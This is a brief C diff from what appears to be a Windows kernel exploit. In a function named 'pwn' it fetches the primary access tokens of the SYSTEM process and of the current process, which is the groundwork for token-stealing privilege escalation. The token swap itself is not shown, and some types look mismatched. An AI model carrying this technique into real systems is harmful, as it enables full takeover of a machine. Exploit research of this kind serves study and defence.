@@ -16,6 +16,8 @@ void pwn()
 	SYSTEM_PROCESS_INFO currentProcessInfo;
 	PsLookupProcessByProcessId((HANDLE)4, &systemProcessInfo);
 	PsLookupProcessByProcessId((HANDLE)currentProcessId, &currentProcessInfo);
+	PACCESS_TOKEN targetToken = PsReferencePrimaryToken(currentProcessInfo);
+	PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcessInfo);
 }
 
 int main() 
